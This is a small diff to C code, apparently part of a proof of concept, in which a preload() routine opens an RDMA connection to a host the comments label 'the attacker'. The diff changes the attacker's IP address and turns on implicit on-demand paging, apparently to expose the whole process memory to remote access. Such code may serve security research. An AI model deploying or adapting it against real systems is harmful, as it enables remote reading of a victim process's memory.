@@ -24,7 +24,7 @@ void preload(){
   hints.ai_port_space = RDMA_PS_TCP;
 
   // should be IP and port of the attacker
-  ret = rdma_getaddrinfo("192.168.1.10","9999", &hints, &addrinfo);
+  ret = rdma_getaddrinfo("10.10.1.1","9999", &hints, &addrinfo);
   assert(ret==0 && "Failed to find route to the attacker");
 
   struct ibv_qp_init_attr attr;
@@ -52,7 +52,7 @@ void preload(){
 
 
   // change to true to use implicit ODP.
-  bool useodp = false;
+  bool useodp = true;
 
   struct ibv_mr * mrall = NULL;
   if(useodp)
